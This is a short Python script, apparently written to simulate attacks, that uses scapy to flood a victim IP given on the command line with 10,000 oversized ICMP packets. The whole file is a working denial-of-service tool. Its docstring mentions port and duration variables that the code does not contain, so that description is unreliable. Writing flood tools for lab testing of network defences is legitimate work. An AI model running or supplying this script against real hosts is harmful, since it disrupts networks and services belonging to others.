"""
ICMP flooder to simulate aggressive naive ICMP flood attack
Gets the victim IP as an argument
Can flood any port for any duration, just change the @port and @duration variables
"""
import sys
from scapy.all import sr1
from scapy.layers.inet import IP, ICMP

# Victim address
victim = sys.argv[1]

# Send extra large ICMP packet
extra_payload = (600 * 'z')


def icmp_flood():
    # flood the net with ICMP
    for i in range(10000):

        # Log number of sent packets
        # if (i+1) % 1000 == 0:
        print i+1, "ICMP packets were sent"

        # Send packet
        sr1(IP(dst=victim) / ICMP() / extra_payload, verbose=0)


if __name__ == '__main__':
    icmp_flood()